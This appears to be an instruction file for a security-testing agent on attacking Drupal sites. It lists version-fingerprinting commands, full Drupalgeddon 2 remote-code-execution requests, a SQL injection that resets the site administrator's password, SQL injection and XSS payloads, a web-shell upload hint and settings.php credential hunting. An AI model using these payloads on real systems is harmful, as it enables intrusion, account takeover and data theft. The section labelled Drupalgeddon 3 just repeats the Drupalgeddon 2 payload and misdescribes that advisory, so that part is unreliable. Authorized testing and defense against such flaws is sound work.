<drupal_security_guide>
<title>DRUPAL SECURITY TESTING</title>

<critical>Drupal security testing focuses on core vulnerabilities (Drupalgeddon patterns), module security, configuration exposure, and API exploitation. Testing must cover SA-CORE advisories, form bypass, Views SQL injection, and RESTful Web Services attacks.</critical>

<scope>
- Drupal version detection and Drupalgeddon vulnerabilities (SA-CORE)
- Module enumeration and vulnerability testing
- Configuration file exposure (settings.php)
- User enumeration techniques
- Form API bypass and injection
- Views SQL injection
- RESTful Web Services exploitation
- Update.php access
</scope>

<methodology>
1. Identify Drupal version and check for SA-CORE advisories.
2. Enumerate installed modules and test for vulnerabilities.
3. Test for Drupalgeddon patterns (RCE, SQLi).
4. Attempt Form API bypass and injection.
5. Test RESTful Web Services for authentication bypass.
6. Search for settings.php and configuration exposure.
</methodology>

<version_detection>
{% raw %}
# Drupal version detection:
curl -s https://example.com/CHANGELOG.txt | head -1
curl https://example.com/core/CHANGELOG.txt
curl -I https://example.com/misc/drupal.js
# X-Generator: Drupal 9
curl https://example.com/node
# Look for "Powered by Drupal"

# Drupalgeddon vulnerabilities:
# SA-CORE-2014-005 (Drupalgeddon 1): SQL injection
# SA-CORE-2018-002 (Drupalgeddon 2): RCE
# SA-CORE-2018-004 (Drupalgeddon 3): RCE
{% endraw %}
</version_detection>

<drupalgeddon_testing>
{% raw %}
# Drupalgeddon 2 (SA-CORE-2018-002) - RCE:
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
Content-Type: application/x-www-form-urlencoded

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id

# Drupalgeddon 3 exploitation:
curl -X POST https://example.com/user/register -d "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=passthru&mail[#type]=markup&mail[#markup]=id"

# SQL injection (Drupalgeddon 1):
POST /node?destination=node
name[0%20;update+users+set+name%3D'admin'+,+pass+%3d+'$S$CTo9G7Lx28...'+where+uid+=+'1';--+]=test&pass=test&form_id=user_login_block
{% endraw %}
</drupalgeddon_testing>

<module_exploitation>
{% raw %}
# Module enumeration:
curl -I https://example.com/sites/all/modules/[module-name]/
curl https://example.com/admin/modules  # Requires auth

# Common vulnerable modules:
# - Views (SQL injection)
# - RESTful Web Services (auth bypass)
# - Coder (RCE)
# - Webform (various issues)

# Views SQL injection:
GET /views/ajax?view_name=test&view_display_id=page_1&view_args[0]=1' OR '1'='1
{% endraw %}
</module_exploitation>

<restful_api_testing>
{% raw %}
# RESTful Web Services testing:
GET /node/1?_format=json
GET /user/1?_format=json

# Unauthorized access:
POST /node?_format=json
{"type":"article","title":"Hacked","body":"Content"}

# Authentication bypass:
POST /user/login?_format=json
{"name":"admin","pass":"password"}
{% endraw %}
</restful_api_testing>

<common_payloads>
{% raw %}
# Drupalgeddon 2:
mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=whoami

# SQL injection:
' OR '1'='1--
' UNION SELECT password FROM users--

# XSS in comments/nodes:
<script>alert(1)</script>

# File upload:
shell.php.txt with PHP code
{% endraw %}
</common_payloads>

<validation>
1. Demonstrate Drupal version and applicable SA-CORE CVE.
2. Show Drupalgeddon exploitation (if vulnerable).
3. Prove module vulnerability with working exploit.
4. Document RESTful API unauthorized access.
5. Show settings.php exposure with database credentials.
</validation>

<impact>
- Remote Code Execution via Drupalgeddon
- SQL injection in Forms or Views
- Authentication bypass via REST API
- Database compromise via settings.php
- Mass defacement and data theft
</impact>

<false_positives>
- CHANGELOG.txt accessible but version is fully patched (no applicable CVEs)
- RESTful API enabled but requires authentication for all endpoints
- update.php accessible but protected by file permissions or .htaccess
- settings.php readable in error messages but contains no real credentials (development defaults)
- Views module enabled but all queries use parameterized input
- User enumeration possible but rate limited and monitored
- Form API accepts input but properly sanitizes before database queries
</false_positives>

<pro_tips>
1. Check Drupal version via CHANGELOG.txt, META tag, or response headers first—it determines applicable exploits.
2. Drupalgeddon 2 (SA-CORE-2018-002) affects Drupal 7.x < 7.58 and 8.x < 8.3.9—prioritize version checks.
3. RESTful Web Services often expose /user/1 (admin) and /node endpoints without authentication.
4. settings.php may be exposed via backup files (.bak, ~, .old) or directory listing.
5. Views SQL injection requires finding user-controlled parameters in Views AJAX requests.
6. Test update.php access—it's often forgotten and allows administrative actions.
7. Drupal 8+ uses Twig templates—test for SSTI if custom templating is used.
8. Check for contributed modules at /sites/all/modules/ or /modules/contrib/—many have CVEs.
9. Form API (#type, #markup) fields with user input often lead to XSS or RCE.
10. Use drupalgeddon2 scanner tools for automated SA-CORE vulnerability detection.
</pro_tips>

<remember>Drupal security: Check for Drupalgeddon vulnerabilities (SA-CORE-2014-005, SA-CORE-2018-002, SA-CORE-2018-004) which allow RCE and SQLi. Test RESTful Web Services for auth bypass. Enumerate modules and check for known vulnerabilities. Look for settings.php exposure containing database credentials.</remember>
</drupal_security_guide>
